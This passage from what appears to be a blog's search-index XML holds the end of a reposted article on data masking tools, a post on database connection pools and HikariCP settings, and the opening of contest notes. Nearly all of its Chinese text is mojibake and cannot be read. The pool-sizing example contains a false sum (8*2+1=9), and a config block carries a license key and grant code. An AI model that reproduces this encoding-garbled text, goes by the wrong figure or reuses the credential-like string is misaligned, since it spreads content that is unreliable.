alt="avatar"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸå®ç°äº†æ•°æ®è„±æ•ã€‚</p><h2 id="4-å…¶ä»–å¸¸è§çš„æ•°æ®è„±æ•å·¥å…·æ¨è"><a href="#4-å…¶ä»–å¸¸è§çš„æ•°æ®è„±æ•å·¥å…·æ¨è" class="headerlink" title="4. å…¶ä»–å¸¸è§çš„æ•°æ®è„±æ•å·¥å…·æ¨è"></a>4. å…¶ä»–å¸¸è§çš„æ•°æ®è„±æ•å·¥å…·æ¨è</h2><p>é™¤äº†æœ¬æ–‡ä»‹ç»çš„Hutoolå·¥å…·ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–çš„æ•°æ®è„±æ•å·¥å…·ï¼Œå¸¸è§è„±æ•æ–¹æ³•æˆ–å·¥å…·å¦‚ä¸‹æ‰€ç¤ºï¼š</p><h3 id="4-1-Apache-ShardingSphere"><a href="#4-1-Apache-ShardingSphere" class="headerlink" title="4.1 Apache ShardingSphere"></a>4.1 Apache ShardingSphere</h3><p>Apache ShardingSphereä¸‹é¢å­˜åœ¨ä¸€ä¸ªæ•°æ®è„±æ•æ¨¡å—ï¼Œæ­¤æ¨¡å—é›†æˆçš„å¸¸ç”¨çš„æ•°æ®è„±æ•çš„åŠŸèƒ½ã€‚å…¶åŸºæœ¬åŸç†æ˜¯å¯¹ç”¨æˆ·è¾“å…¥çš„SQLè¿›è¡Œè§£ææ‹¦æˆªï¼Œå¹¶ä¾é ç”¨æˆ·çš„è„±æ•é…ç½®è¿›è¡ŒSQLçš„æ”¹å†™ï¼Œä»è€Œå®ç°å¯¹åŸæ–‡å­—æ®µçš„åŠ å¯†åŠåŠ å¯†å­—æ®µçš„è§£å¯†ã€‚æœ€ç»ˆå®ç°å¯¹ç”¨æˆ·æ— æ„Ÿçš„åŠ è§£å¯†å­˜å‚¨ã€æŸ¥è¯¢ã€‚</p><p>å…·ä½“å®ç°æ–¹å¼å¯å‚è€ƒä¸‹é¢æ–‡ç« ï¼š <a href="https://jaskey.github.io/blog/2020/03/18/sharding-sphere-data-desensitization/">https://jaskey.github.io/blog/2020/03/18/sharding-sphere-data-desensitization/</a></p><h3 id="4-2-FastJSON"><a href="#4-2-FastJSON" class="headerlink" title="4.2 FastJSON"></a>4.2 FastJSON</h3><p>å¹³æ—¶å¼€å‘Webé¡¹ç›®çš„æ—¶å€™ï¼Œé™¤äº†é»˜è®¤çš„Springè‡ªå¸¦çš„åºåˆ—åŒ–å·¥å…·ï¼ŒFastJsonä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆå¸¸ç”¨çš„Spring web Restfulæ¥å£åºåˆ—åŒ–çš„å·¥å…·ã€‚</p><p>FastJSONå®ç°æ•°æ®è„±æ•çš„æ–¹å¼ä¸»è¦æœ‰ä¸¤ç§ï¼š</p><ul><li>åŸºäºæ³¨è§£@JSONFieldå®ç°ï¼šéœ€è¦è‡ªå®šä¹‰ä¸€ä¸ªç”¨äºè„±æ•çš„åºåˆ—åŒ–çš„ç±»ï¼Œç„¶ååœ¨éœ€è¦è„±æ•çš„å­—æ®µä¸Šé€šè¿‡@JSONFieldä¸­çš„serializeUsing æŒ‡å®šä¸ºæˆ‘ä»¬è‡ªå®šä¹‰çš„åºåˆ—åŒ–ç±»å‹å³å¯ã€‚</li><li>åŸºäºåºåˆ—åŒ–è¿‡æ»¤å™¨ï¼šéœ€è¦å®ç°ValueFilteræ¥å£ï¼Œé‡å†™processæ–¹æ³•å®Œæˆè‡ªå®šä¹‰è„±æ•ï¼Œç„¶ååœ¨JSONè½¬æ¢æ—¶ä½¿ç”¨è‡ªå®šä¹‰çš„è½¬æ¢ç­–ç•¥ã€‚å…·ä½“å®ç°å¯å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š <a href="https://juejin.cn/post/7067916686141161479">https://juejin.cn/post/7067916686141161479</a></li></ul><h3 id="4-3-Mybatis-mate"><a href="#4-3-Mybatis-mate" class="headerlink" title="4.3 Mybatis-mate"></a>4.3 Mybatis-mate</h3><p>mybatisplusä¹Ÿæä¾›äº†æ•°æ®è„±æ•æ¨¡å—ï¼Œmybatis-mateï¼Œä¸è¿‡åœ¨ä½¿ç”¨ä¹‹å‰éœ€è¦é…ç½®æˆæƒç ã€‚</p><p>é…ç½®å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\# Mybatis Mate é…ç½®</span><br><span class="line">mybatis-mate:</span><br><span class="line">  cert:</span><br><span class="line">    grant: jxftsdfggggx</span><br><span class="line">    license: GKXP9r4MCJhGID/DTGigcBcLmZjb1YZGjE4GXaAoxbtGsPC20sxpEtiUr2F7Nb1ANTUekvF6Syo6DzraA4M4oacwoLVTglzfvaEfadfsd232485eLJK1QsskrSJmreMnEaNh9lsV7Lpbxy9JeGCeM0HPEbRvq8Y+8dUt5bQYLklsa3ZIBexir+4XykZY15uqn1pYIp4pEK0+aINTa57xjJNoWuBIqm7BdFIb4l1TAcPYMTsMXhF5hfMmKD2h391HxWTshJ6jbt4YqdKD167AgeoM+B+DE1jxlLjcpskY+kFs9piOS7RCcmKBBUOgX2BD/JxhR2gQ==</span><br></pre></td></tr></table></figure><br>å…·ä½“å®ç°å¯å‚è€ƒbaomidouæä¾›çš„å¦‚ä¸‹ä»£ç ï¼š <a href="https://gitee.com/baomidou/mybatis-mate-examples">https://gitee.com/baomidou/mybatis-mate-examples</a></p><h2 id="5-æ€»ç»“"><a href="#5-æ€»ç»“" class="headerlink" title="5. æ€»ç»“"></a>5. æ€»ç»“</h2><p>æœ¬æ–‡ä¸»è¦ä»‹ç»äº†æ•°æ®è„±æ•çš„ç›¸å…³å†…å®¹ï¼Œé¦–å…ˆä»‹ç»äº†æ•°æ®è„±æ•çš„æ¦‚å¿µï¼Œåœ¨æ­¤åŸºç¡€ä¸Šä»‹ç»äº†å¸¸ç”¨çš„æ•°æ®è„±æ•è§„åˆ™ï¼›éšåä»‹ç»äº†æœ¬æ–‡çš„é‡ç‚¹Hutoolå·¥å…·åŠå…¶ä½¿ç”¨æ–¹æ³•ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šè¿›è¡Œäº†å®æ“ï¼Œåˆ†åˆ«æ¼”ç¤ºäº†ä½¿ç”¨DesensitizedUtilå·¥å…·ç±»ã€é…åˆJacksoné€šè¿‡æ³¨è§£çš„æ–¹å¼å®Œæˆæ•°æ®è„±æ•ï¼›æœ€åï¼Œä»‹ç»äº†ä¸€äº›å¸¸è§çš„æ•°æ®è„±æ•æ–¹æ³•ï¼Œå¹¶é™„ä¸Šäº†å¯¹åº”çš„æ•™ç¨‹é“¾æ¥ä¾›å¤§å®¶å‚è€ƒï¼Œæœ¬æ–‡å†…å®¹å¦‚æœ‰ä¸å½“ä¹‹å¤„ï¼Œè¿˜è¯·å¤§å®¶æ‰¹è¯„æŒ‡æ­£ã€‚</p><h2 id="6-å‚è€ƒå†…å®¹"><a href="#6-å‚è€ƒå†…å®¹" class="headerlink" title="6. å‚è€ƒå†…å®¹"></a>6. å‚è€ƒå†…å®¹</h2><p>Hutoolå·¥å…·å®˜ç½‘ï¼š <a href="https://hutool.cn/docs/#/?id=%f0%9f%93%9a%e7%ae%80%e4%bb%8b">https://hutool.cn/docs/#/?id=%f0%9f%93%9a%e7%ae%80%e4%bb%8b</a></p><p>èŠèŠå¦‚ä½•è‡ªå®šä¹‰æ•°æ®è„±æ•ï¼š <a href="https://juejin.cn/post/7046567603971719204">https://juejin.cn/post/7046567603971719204</a></p><p>FastJSONå®ç°æ•°æ®è„±æ•ï¼š <a href="https://juejin.cn/post/7067916686141161479">https://juejin.cn/post/7067916686141161479</a></p><blockquote><p>ä½œè€…ï¼šäº¬ä¸œç§‘æŠ€ å­™æ‰¬å¨</p><p>æ¥æºï¼šäº¬ä¸œäº‘å¼€å‘è€…ç¤¾åŒº</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨ </tag>
            
            <tag> è½¬è½½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®åº“è¿æ¥æ± </title>
      <link href="/2024/02/16/2024-2-16-%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%B1%A0/"/>
      <url>/2024/02/16/2024-2-16-%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%B1%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="æ•°æ®åº“è¿æ¥æ± "><a href="#æ•°æ®åº“è¿æ¥æ± " class="headerlink" title="æ•°æ®åº“è¿æ¥æ± "></a>æ•°æ®åº“è¿æ¥æ± </h2><h3 id="ä¸ºä»€ä¹ˆéœ€è¦è¿æ¥æ± "><a href="#ä¸ºä»€ä¹ˆéœ€è¦è¿æ¥æ± " class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦è¿æ¥æ± "></a>ä¸ºä»€ä¹ˆéœ€è¦è¿æ¥æ± </h3><p>å½“ä¸€ä¸ªæ•°æ®åº“æ“ä½œä»»åŠ¡åˆ°æ¥æ—¶ï¼Œç¨‹åºéœ€è¦å’Œæ•°æ®åº“å»ºç«‹è¿æ¥ï¼Œè¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ã€æ•°æ®åº“ç”¨æˆ·éªŒè¯ï¼Œç„¶åæ‰§è¡ŒSQLè¯­å¥ï¼Œæœ€åç”¨æˆ·é€€å‡ºã€å››æ¬¡æŒ¥æ‰‹å…³é—­è¿æ¥ã€‚æ¯æ¬¡ä»»åŠ¡éƒ½æ‰§è¡Œè¿™æ ·çš„æµç¨‹ï¼Œé‚£ä¹ˆæ•´ä¸ªæµç¨‹ä¸­ï¼ŒçœŸæ­£æœ‰æ•ˆè€Œä¸”å˜åŒ–çš„åªæœ‰<code>æ‰§è¡ŒSQL</code>è¯­å¥è¿™ä¸€æ­¥éª¤ï¼Œè€Œä¸”æ¯æ¬¡å»ºç«‹è¿æ¥ã€ç”¨æˆ·éªŒè¯ã€å…³é—­è¿æ¥éƒ½è€—è´¹æ—¶é—´ã€‚</p><p>å› æ­¤ï¼Œè€ƒè™‘èƒ½ä¸èƒ½å°†è¿æ¥åªåˆ›å»ºä¸€æ¬¡ï¼Œç„¶åå¤ç”¨é•¿è¿æ¥æ‰§è¡Œ SQL è¯­å¥å‘¢ï¼Ÿè¿™éœ€è¦<strong>æ± åŒ–æŠ€æœ¯</strong>ã€‚</p><p>æ± åŒ–æŠ€æœ¯å¯ä»¥å‡å°‘èµ„æºå¯¹è±¡çš„åˆ›å»ºæ¬¡æ•°ï¼Œæé«˜ç¨‹åºçš„å“åº”æ€§èƒ½ï¼Œç‰¹åˆ«æ˜¯å¯¹é«˜å¹¶å‘åœºæ™¯ä¸‹çš„æ€§èƒ½æå‡éå¸¸æ˜æ˜¾ã€‚<br>é€‚åˆä½¿ç”¨æ± åŒ–æŠ€æœ¯ç¼“å­˜çš„èµ„æºå¯¹è±¡å…·æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š</p><ul><li>å¯¹è±¡åˆ›å»ºæ—¶é—´é•¿</li><li>å¯¹è±¡å ç”¨èµ„æºå¤š</li><li>å¯¹è±¡åˆ›å»ºåå¯ä»¥é‡å¤ä½¿ç”¨</li></ul><h3 id="æ•°æ®åº“è¿æ¥æ± -1"><a href="#æ•°æ®åº“è¿æ¥æ± -1" class="headerlink" title="æ•°æ®åº“è¿æ¥æ± "></a>æ•°æ®åº“è¿æ¥æ± </h3><p>æ•°æ®åº“è¿æ¥æ± æ˜¯ç¨‹åºå¯åŠ¨æ—¶å»ºç«‹ä¸€å®šæ•°é‡çš„æ•°æ®åº“è¿æ¥ï¼Œå¹¶å°†è¿™äº›è¿æ¥ç»„æˆä¸€ä¸ªè¿æ¥æ± ï¼Œå½“ç¨‹åºéœ€è¦ç”¨åˆ°è¿æ¥å»è¿›è¡Œæ•°æ®åº“æ“ä½œçš„æ—¶å€™,ç›´æ¥ä»è¿æ¥æ± ä¸­è·å–ä¸€ä¸ªè¿æ¥å¯¹è±¡ä½¿ç”¨ï¼Œä½¿ç”¨å®Œæ¯•åï¼Œå°†è¿æ¥å¯¹è±¡å½’è¿˜ç»™è¿æ¥æ± ã€‚</p><p><strong>ä¼˜ç‚¹</strong>:<br>ï¼ˆ1ï¼‰èµ„æºå¤ç”¨ã€‚é¿å…äº†é¢‘ç¹çš„åˆ›å»ºã€é‡Šæ”¾è¿æ¥å¼•èµ·çš„æ€§èƒ½å¼€é”€ï¼Œå‡å°‘ç³»ç»Ÿæ¶ˆè€—ï¼Œå¢è¿›ç³»ç»Ÿè¿è¡Œç¯å¢ƒçš„ç¨³å®šï¼ˆå‡å°‘å†…å­˜ç¢ç‰‡å’Œæ•°æ®åº“ä¸´æ—¶çº¿ç¨‹/è¿›ç¨‹æ•°é‡ï¼‰ã€‚<br>ï¼ˆ2ï¼‰æ›´å¿«çš„ç³»ç»Ÿå“åº”é€Ÿåº¦ã€‚æ•°æ®åº“è¿æ¥æ± åˆå§‹åŒ–å®Œæˆåï¼Œç›´æ¥åˆ©ç”¨ç°æœ‰å¯ç”¨è¿æ¥ï¼Œé¿å…äº†ä»æ•°æ®åº“è¿æ¥åˆå§‹åŒ–å’Œé‡Šæ”¾è¿‡ç¨‹çš„å¼€é”€ï¼Œä»è€Œç¼©å‡äº†ç³»ç»Ÿæ•´ä½“å“åº”æ—¶é—´ã€‚<br>ï¼ˆ3ï¼‰ç»Ÿä¸€çš„è¿æ¥ç®¡ç†ï¼Œé¿å…æ•°æ®åº“è¿æ¥æ³„æ¼ã€‚æ•°æ®åº“è¿æ¥æ± å®ç°ä¸­ï¼Œå¯æ ¹æ®é¢„å…ˆçš„è¿æ¥å ç”¨è¶…æ—¶è®¾å®šï¼Œå¼ºåˆ¶æ”¶å›è¢«å ç”¨è¿æ¥ã€‚ä»è€Œé¿å…äº†å¸¸è§„æ•°æ®åº“è¿æ¥æ“ä½œä¸­å¯èƒ½å‡ºç°çš„èµ„æºæ³„éœ²ã€‚</p><h4 id="å…³é”®å‚æ•°-ä»¥HikariCPä¸ºä¾‹"><a href="#å…³é”®å‚æ•°-ä»¥HikariCPä¸ºä¾‹" class="headerlink" title="å…³é”®å‚æ•°(ä»¥HikariCPä¸ºä¾‹)"></a>å…³é”®å‚æ•°(ä»¥HikariCPä¸ºä¾‹)</h4><ol><li><code>connectionTimeout</code>ï¼šå®¢æˆ·ç«¯ç­‰å¾…æ± ä¸­è¿æ¥çš„æœ€å¤§äº‹ä»¶ï¼ˆæ¯«ç§’ï¼‰ï¼Œè¶…æ—¶åˆ™ä¼šæŠ›å‡º SQLExceptionï¼Œæœ€ä½å¯æ¥å—æ—¶é—´ä¸º 250msï¼Œé»˜è®¤å€¼ä¸º30000ms</li><li><code>maximumPoolSize</code>ï¼šè¿æ¥æ± ä¸­çš„æœ€å¤§è¿æ¥æ•°ã€‚é»˜è®¤ä¸º 10</li><li><code>minimumIdle</code>ï¼šæ§åˆ¶ HikariCP ä¸­ç»´æŠ¤çš„æœ€å°ç©ºé—²è¿æ¥æ•°ã€‚å½“ç©ºé—²è¿æ¥æ•°å°äº minimumIdle å¹¶ä¸”æ± ä¸­çš„æ€»è¿æ¥æ•°å°‘äº maximumPoolSize æ—¶ï¼ŒHikariCP å°†æ·»åŠ å…¶ä»–è¿æ¥ç›´åˆ° maximumPoolSizeã€‚ä¸ºäº†è·å¾—æœ€ä½³æ€§èƒ½å’Œå¯¹å³°å€¼éœ€æ±‚çš„å“åº”èƒ½åŠ›å»ºè®®ä¸è¦è®¾ç½®æ­¤å€¼ã€‚ é»˜è®¤å€¼ä¸ maximumPoolSize ç›¸åŒ</li><li><code>idleTimeout</code>ï¼šæ± ä¸­è¿æ¥ä¿æŒç©ºé—²çŠ¶æ€çš„æœ€é•¿æ—¶é—´ï¼Œåªæœ‰åœ¨å®šä¹‰çš„minimumIdle å°äºmaximumPoolSizeæ—¶ç”Ÿæ•ˆï¼Œå…è®¸çš„æœ€å°æ—¶é—´ä¸º 10000ms,é»˜è®¤ä¸º 600000ms.å½“ä½ é…ç½®äº†minimumIdle ä¸”å®ƒçš„å€¼è¿˜å’ŒmaximumPoolSizeä¸åŒçš„æ—¶å€™ï¼Œå°±ç›¸å½“äºå‘Šè¯‰HikariCPï¼Œä½ è‡³å°‘å¾—ç»™æˆ‘åˆ›å»ºminimumIdle å¤šçš„è¿æ¥å¤‡ç€ã€‚ä½†æ˜¯å½“ä½ çš„ç³»ç»Ÿå¿™çš„æŠŠminimumIdle ä¸ªå¤‡ç€çš„è¿æ¥éƒ½æ‹¿èµ°ä½¿ç”¨æ—¶ï¼Œæ­¤æ—¶å†é—®HikariCPç´¢è¦ï¼Œå®ƒå°±å¾—ç»™ä½ åˆ›å»ºå¤šäºminimumIdle çš„è¿æ¥ï¼Œé™¤éæœ‰è¿æ¥è¿˜å›æ¥ï¼Œå¦åˆ™æˆ‘å°±å¾—ä¸€ç›´ç»™ä½ åˆ›å»ºæ–°çš„ï¼Œç›´åˆ°è¾¾åˆ°ä¸Šé™â€”â€”maximumPoolSizeã€‚ä½†æ˜¯ï¼Œå½“ä½ çš„ç³»ç»Ÿè¿‡äº†å¿™ç¢ŒæœŸï¼Œé—²ä¸‹æ¥çš„æ—¶å€™ï¼Œå¤šåˆ›å»ºå‡ºæ¥çš„é‚£äº›è¿æ¥ï¼ŒHikariCPå°±å¾—æŠ½ç©ºç»™å¹²æ‰ï¼Œå› ä¸ºå®ƒåªéœ€è¦ä¿ç•™minimumIdle ä¸ªå°±å¥½äº†ï¼Œå¤šäº†æµªè´¹ã€‚æ­¤æ—¶è¿™ä¸ªidleTimeoutå‚æ•°å°±æœ‰ç”¨äº†ï¼Œå®ƒå°±æ˜¯ç”¨æ¥å‘Šè¯‰HikariCPï¼Œå¤šå‡ºæ¥çš„è¿™äº›è¿æ¥ï¼Œå¤šé•¿æ—¶é—´æ²¡å†è¢«ä½¿ç”¨ï¼Œä½ å°±å¯ä»¥å¹²æ‰äº†ã€‚</li><li><code>connectionTestQuery</code>: ç”¨æ¥æµ‹è¯•è¿æ¥æ˜¯å¦å¯ç”¨çš„ SQL æŸ¥è¯¢ï¼ŒHikariCP é»˜è®¤ä¼šä½¿ç”¨ <code>SELECT 1</code> è¯­å¥è¿›è¡Œæµ‹è¯•ï¼Œå¦‚æœè®¾ç½®ä¸ºnullï¼Œåˆ™ä¸ä¼šè¿›è¡Œæµ‹è¯•ã€‚</li><li><code>maxLifetime</code>: <strong>æœ€æœ‰å¯èƒ½å‡ºç°å‘çš„å‚æ•°</strong>.æ± ä¸­è¿æ¥çš„æœ€å¤§ç”Ÿå‘½å‘¨æœŸï¼Œé»˜è®¤å€¼ä¸º1800000msï¼Œå³30åˆ†é’Ÿã€‚å¦‚æœè®¾ç½®ä¸º0ï¼Œè¡¨ç¤ºå­˜æ´»æ—¶é—´æ— é™å¤§ã€‚å¦‚æœä¸ç­‰äº0ä¸”å°äº30ç§’åˆ™ä¼šè¢«é‡ç½®å›30åˆ†é’Ÿã€‚å¦‚æœè®¾ç½®äº†maxLifetimeï¼Œåˆ™HikariCPç»™æ± ä¸­åˆ›å»ºçš„æ¯ä¸ªè¿æ¥ï¼Œéƒ½ä¼šå®šæ—¶æ£€æµ‹ï¼Œä¸ç®¡è¿™ä¸ªè¿æ¥ä¸Šä¸€æ¬¡æ˜¯ä»€ä¹ˆæ—¶å€™ä½¿ç”¨çš„ï¼Œåªè¦åœ¨æ£€æµ‹æ—¶å®ƒæ²¡åœ¨ä½¿ç”¨ä¸­ï¼Œå°±ä¼šè¢«æ·˜æ±°ã€‚æ³¨æ„ï¼Œè¿™å°±æ˜¯maxLifetimeå‚æ•°éš¾ä»¥è¢«ç†è§£çš„åŸå› â€”â€”å“ªæ€•æ˜¯ä¸€ä¸ªåˆšç”¨å®Œå½’è¿˜çš„è¿æ¥ï¼Œä¸å¹¸ç¢°å·§èµ¶ä¸Šæ£€æµ‹äº†ï¼Œåªèƒ½è¯´æ°¸åˆ«â€”â€”ä½¿å¾—è¿™ä¸ªå‚æ•°èƒŒåçš„é€»è¾‘æ˜¾å¾—éå¸¸ä¸åˆç†ã€‚ä½†ç»è¿‡æœç´¢,<code>ä½œè€…çš„æƒ³æ³•æ˜¯</code>:ä¸€ä¸ªè¿æ¥å³ä½¿ä¸€ç›´èƒ½ç”¨ï¼Œä¹Ÿä¸åº”è¯¥ä¸€ç›´å­˜åœ¨ä¸‹å»ï¼Œåº”è¯¥å®šæ—¶çš„å…³é—­ï¼ˆå“ªæ€•ä¸€å¤©å…³ä¸€æ¬¡ï¼‰ï¼Œå¥½è®©æ•°æ®åº“æœåŠ¡å™¨é‚£è¾¹æ¸…ç†æ‰ä¸€äº›æµªè´¹çš„èµ„æºã€‚æ‰€ä»¥è¿™æ‰æ˜¯maxLifetimeæœ€æ ¹æœ¬å­˜åœ¨çš„åŸå› ã€‚</li></ol><h4 id="è¿æ¥æ•°è®¾ç½®ä¸ºå¤šå°‘æ‰åˆé€‚"><a href="#è¿æ¥æ•°è®¾ç½®ä¸ºå¤šå°‘æ‰åˆé€‚" class="headerlink" title="è¿æ¥æ•°è®¾ç½®ä¸ºå¤šå°‘æ‰åˆé€‚"></a>è¿æ¥æ•°è®¾ç½®ä¸ºå¤šå°‘æ‰åˆé€‚</h4><ol><li>ç»éªŒå…¬å¼ï¼Œè¿æ¥æ•°=ï¼ˆæ ¸å¿ƒæ•°*2ï¼‰+æœ‰æ•ˆç£ç›˜æ•°ã€‚</li></ol><p>å‡å¦‚æœåŠ¡å™¨CPUæ˜¯i7çš„8æ ¸ï¼Œé‚£ä¹ˆè¿æ¥æ± è¿æ¥æ•°å¤§å°ä¸º 8âˆ—2+1=9 ã€‚è¿™ä»…ä»…æ˜¯ä¸€ä¸ªç»éªŒå…¬å¼ï¼Œå…·ä½“çš„è¿˜è¦å’Œçº¿ç¨‹æ± æ•°é‡ä»¥åŠå…·ä½“ä¸šåŠ¡ç»“åˆåœ¨ä¸€èµ·ã€‚</p><ol><li>IOå¯†é›†å‹ä»»åŠ¡</li></ol><p>å¦‚æœä»»åŠ¡æ•´ä½“ä¸Šæ˜¯ä¸€ä¸ªIOå¯†é›†å‹çš„ä»»åŠ¡ã€‚åœ¨å¤„ç†ä¸€ä¸ªè¯·æ±‚çš„è¿‡ç¨‹ä¸­ï¼ˆå¤„ç†ä¸€ä¸ªä»»åŠ¡ï¼‰ï¼Œæ€»å…±è€—æ—¶100+5=105msï¼Œè€Œå…¶ä¸­åªæœ‰5msæ˜¯ç”¨äºè®¡ç®—æ“ä½œçš„ï¼ˆæ¶ˆè€—cpuï¼‰ï¼Œå¦å¤–çš„100msç­‰å¾…ioå“åº”ï¼ŒCPUåˆ©ç”¨ç‡ä¸º5/(100+5)ã€‚</p><p>ä½¿ç”¨çº¿ç¨‹æ± æ˜¯ä¸ºäº†å°½é‡æé«˜CPUçš„åˆ©ç”¨ç‡ï¼Œå‡å°‘å¯¹CPUèµ„æºçš„æµªè´¹ï¼Œå‡è®¾ä»¥100%çš„CPUåˆ©ç”¨ç‡æ¥è¯´ï¼Œè¦è¾¾åˆ°100%çš„CPUåˆ©ç”¨ç‡ï¼Œå¯¹äºä¸€ä¸ªCPUå°±è¦è®¾ç½®å…¶åˆ©ç”¨ç‡çš„å€’æ•°ä¸ªæ•°çš„çº¿ç¨‹æ•°ï¼Œä¹Ÿå³1/(5/(100+5))=21ï¼Œ4ä¸ªCPUçš„è¯å°±ä¹˜ä»¥4ï¼Œå³84ï¼Œè¿™ä¸ªæ—¶å€™çº¿ç¨‹æ± è¦è®¾ç½®84ä¸ªçº¿ç¨‹æ•°ï¼Œç„¶åè¿æ¥æ± ä¹Ÿæ˜¯è®¾ç½®ä¸º84ä¸ªè¿æ¥ã€‚</p><h4 id="è¿æ¥æ± å’Œé•¿è¿æ¥çš„åŒºåˆ«"><a href="#è¿æ¥æ± å’Œé•¿è¿æ¥çš„åŒºåˆ«" class="headerlink" title="è¿æ¥æ± å’Œé•¿è¿æ¥çš„åŒºåˆ«"></a>è¿æ¥æ± å’Œé•¿è¿æ¥çš„åŒºåˆ«</h4><ul><li><p>é•¿è¿æ¥æ˜¯ä¸€äº›é©±åŠ¨ã€é©±åŠ¨æ¶æ„ã€ORM(å³Object-Relational Mapping)å·¥å…·çš„ç‰¹æ€§ï¼Œç”±é©±åŠ¨æ¥ä¿æŒè¿æ¥å¥æŸ„çš„æ‰“å¼€ï¼Œä»¥ä¾¿åç»­çš„æ•°æ®åº“æ“ä½œå¯ä»¥é‡ç”¨è¿æ¥ï¼Œä»è€Œå‡å°‘æ•°æ®åº“çš„è¿æ¥å¼€é”€ã€‚</p></li><li><p>è¿æ¥æ± æ˜¯åº”ç”¨æœåŠ¡å™¨çš„ç»„ä»¶ï¼Œå®ƒå¯ä»¥é€šè¿‡å‚æ•°æ¥é…ç½®è¿æ¥æ•°ã€è¿æ¥æ£€æŸ¥ã€è¿æ¥çš„ç”Ÿå‘½å‘¨æœŸç­‰ã€‚</p></li><li><p>è¿æ¥æ± å†…çš„è¿æ¥ï¼Œå…¶å®å°±æ˜¯é•¿è¿æ¥ã€‚</p></li></ul><h3 id="å¦‚ä½•ç®€å•å®ç°ä¸€ä¸ªè¿æ¥æ± "><a href="#å¦‚ä½•ç®€å•å®ç°ä¸€ä¸ªè¿æ¥æ± " class="headerlink" title="å¦‚ä½•ç®€å•å®ç°ä¸€ä¸ªè¿æ¥æ± "></a>å¦‚ä½•ç®€å•å®ç°ä¸€ä¸ªè¿æ¥æ± </h3><p>å®ç°ä¸€ä¸ªè¿æ¥æ± ï¼Œæœ€å…³é”®çš„æ˜¯<strong>å‡è¡¡</strong>å’Œ<strong>ä¿æ´»</strong>.è¿æ¥æ± çš„â€œæ± â€é€šè¿‡é˜Ÿåˆ—æ•°æ®ç»“æ„è¿›è¡Œå®ç°ï¼Œé˜Ÿåˆ—å…ˆè¿›å…ˆå‡ºçš„ç‰¹æ€§ä¿è¯äº†ä½¿ç”¨è¿æ¥çš„å‡è¡¡æ€§ï¼Œæ¯ä¸€æ¡è¿æ¥éƒ½å¯ä»¥å‡åŒ€çš„è¢«ä½¿ç”¨åˆ°.è¿æ¥æ± å¯¹å¤–æä¾›get()å’Œfree()ä¸¤ä¸ªAPIï¼Œget()ç”¨äºä»é˜Ÿé¦–â€œå‡ºé˜Ÿâ€è·å–ä¸€æ¡å¯ç”¨è¿æ¥ï¼Œfree()ç”¨äºå°†ä½¿ç”¨å®Œçš„è¿æ¥ä»å¯¹å°¾â€œå…¥é˜Ÿâ€é‡Šæ”¾åˆ°é˜Ÿåˆ—ä¸­ã€‚</p><p>ä¸šåŠ¡ä»£ç åœ¨ä½å³°æ—¶ä¼šé™ä½get()åŠ¨ä½œï¼Œæ‰€ä»¥è¿æ¥æ± ä¸­çš„è¿æ¥åœ¨é•¿æ—¶é—´ä¸ç”¨æ—¶ä¼šå¯¼è‡´å¤±æ•ˆï¼Œæ­¤æ—¶ä¿æ´»çº¿ç¨‹åœ¨ç›‘æµ‹åˆ°get()çš„ä½¿ç”¨é¢‘ç‡è¾ƒä½æ—¶ï¼Œä¼šæ¨¡æ‹Ÿä¸šåŠ¡ç¨‹åºè°ƒç”¨get()è·å–è¿æ¥åå‘é€å¿ƒè·³åŒ…ï¼Œç„¶åå†é€šè¿‡free()å°†è¢«ä¿æ´»çš„è¿æ¥æ”¾å›é˜Ÿåˆ—ä¸­ï¼Œè¾¾åˆ°è¿æ¥æ± ä¸­æ‰€æœ‰è¿æ¥ä¿æ´»çš„ç›®çš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¾èµ›Cé¢˜å­¦ä¹ </title>
      <link href="/2024/01/24/2024-1-MCM/"/>
      <url>/2024/01/24/2024-1-MCM/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¾èµ›Cé¢˜å­¦ä¹ "><a href="#ç¾èµ›Cé¢˜å­¦ä¹ " class="headerlink" title="ç¾èµ›Cé¢˜å­¦ä¹ "></a>ç¾èµ›Cé¢˜å­¦ä¹ </h2><p>å¦‚æœè‡ªå»ºæ¨¡å‹,å¯ä»¥å‚è€ƒ2218931çš„4.2.1,2218931çš„è®ºæ–‡æè¿°å€¼å¾—å­¦ä¹ ,æœ€åçš„ä¿¡ä¹Ÿæ¯”è¾ƒæœ‰ç‰¹è‰²</p><p>è·Ÿç°å®ç›¸ç»“åˆä¹Ÿæ˜¯å¾ˆé‡è¦çš„ç‚¹,æœ€å¥½èƒ½æœ‰æ¡ˆä¾‹æ”¯æ’‘,è™½ç„¶è¯´åœ¨Cé¢˜ä¸­ä¸å¸¸è§,ä½†å…¶å®æœ‰çš„åœ°æ–¹ä¹Ÿå¯ä»¥åŠ ä¸Š</p><h3 id="æ—¶é—´åºåˆ—é¢„æµ‹"><a href="#æ—¶é—´åºåˆ—é¢„æµ‹" class="headerlink" 